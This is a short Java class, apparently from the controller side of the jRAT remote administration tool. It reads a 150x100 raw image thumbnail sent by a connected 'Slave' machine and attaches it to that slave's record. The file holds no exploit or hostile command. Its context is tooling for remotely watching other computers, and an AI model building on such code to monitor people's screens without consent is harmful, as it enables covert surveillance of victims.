package se.jrat.client.packets.incoming;

import java.awt.image.BufferedImage;
import java.awt.image.DataBufferByte;
import java.io.DataInputStream;

import javax.swing.ImageIcon;

import se.jrat.client.Slave;


public class Packet33Thumbnail extends AbstractIncomingPacket {

	private BufferedImage bufferedImage;

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		bufferedImage = new BufferedImage(150, 100, BufferedImage.TYPE_3BYTE_BGR);
		byte[] buffer = ((DataBufferByte) bufferedImage.getRaster().getDataBuffer()).getData();

		slave.getDataInputStream().readFully(buffer);

		slave.setThumbnail(new ImageIcon(bufferedImage));
	}

}
